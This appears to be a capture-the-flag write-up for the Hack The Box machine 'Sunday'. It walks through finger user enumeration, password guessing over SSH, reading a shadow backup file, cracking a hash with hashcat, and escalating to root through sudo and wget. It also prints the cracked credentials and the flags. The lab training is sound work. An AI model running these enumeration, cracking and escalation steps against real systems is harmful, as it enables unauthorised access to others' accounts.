Machine: https://app.hackthebox.com/machines/136	
IP: 10.10.10.76

# Enumeration

Port 79

finger service (Old service)

The finger daemon listens on port 79, and is really a relic of a time when computers were far too trusting and open. It provides status reports on logged in users. It can also provide details about a specific user and when they last logged in and from where.

To tell currently logged in users:

`finger @10.10.10.76`

Port 111
Port 515
Port 6787
Port 22022 (SSH)

```
SSH-2.0-OpenSSH_8.4
Invalid SSH identification string.
```

# Exploitation

http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz

Using this tool, we can brute force to find existing user on through finger service.

```bash
sammy@10.10.10.76: sammy                 pts/2        <Sep 27 13:55> 10.10.16.26         ..
sunny@10.10.10.76: sunny                 pts/3        <Apr 24 10:48> 10.10.14.4    
```

User:

```
sunny
sammy
```

These 2 users have sessions on the target.

Try to login as sunny user via SSH

To save time brute forcing, `sunny:sunday`

# Post-Exploitation

Banner after logged in

`Oracle Solaris 11.4.42.111.0                  Assembled December 2021`

History
```
sunny@sunday:~$ history
    1  su -
    2  su -
    3  cat /etc/resolv.conf 
    4  su -
    5  ps auxwww|grep overwrite
    6  su -
    7  sudo -l
    8  sudo /root/troll
    9  ls /backup
   10  ls -l /backup
   11  cat /backup/shadow.backup
   12  sudo /root/troll
   13  sudo /root/troll
   14  su -
   15  sudo -l
   16  sudo /root/troll
   17  ps auxwww
   18  ps auxwww
   19  ps auxwww
   20  top
   21  top
   22  top
   23  ps auxwww|grep overwrite
   24  su -
   25  su -
   26  cat /etc/resolv.conf 
   27  ps auxwww|grep over
   28  sudo -l
   29  sudo /root/troll
   30  sudo /root/troll
   31  sudo /root/troll
   32  sudo /root/troll
```

One line stands out

`ls -l /backup`

/backup/shadow.backup

```
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

/backup/agent22.backup
```
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Crack with hascat

`hashcat -m 7400 '$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB' /usr/share/wordlists/rockyou.txt`

`sammy:cooldude!`

Login as sammy through SSH (Port 22022)

user.txt 3490af4aa407c2c6864ad4a4634148e9

`find / -perm -4000 2>/dev/null`

some SUID binaries can be used to get to root

```
/usr/bin/sudo
/usr/bin/su
```

Get root

`sudo su` or `sudo sudo /bin/bash`

Or by checking `sudo -l`

`(root) NOPASSWD: /usr/bin/wget`

https://gtfobins.github.io/gtfobins/wget/#sudo

root.txt 46060b09da8ecb2a5242e56948466cbb

# Beyond Root

https://0xdf.gitlab.io/2018/09/29/htb-sunday.html


